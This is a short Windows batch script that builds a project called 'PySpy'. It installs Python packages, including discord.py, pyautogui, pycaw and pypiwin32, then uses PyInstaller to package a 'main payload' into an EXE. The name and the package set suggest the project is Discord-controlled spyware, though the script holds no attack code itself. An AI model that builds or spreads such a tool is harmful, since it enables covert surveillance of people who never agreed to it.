@echo off
title PySpy
echo Please setup config.json before continuing. If you already have, continue.
pause

echo Installing pip
python -m pip install --upgrade pip
echo Installed pip

echo Installing Packages
pip install psutil discord.py pyautogui numpy pyttsx3 pycaw requests pycryptodome pypiwin32
echo Installed Packages

echo Compiling scripts
python build.py
echo Compiled scripts

echo Packaging main payload
pyinstaller script.spec
echo Packaged main payload

echo Build completed. Final EXE is in the dist folder.
echo Run rebuild.bat if there was an error or you would like to rebuild the EXE.
pause
exit /b 0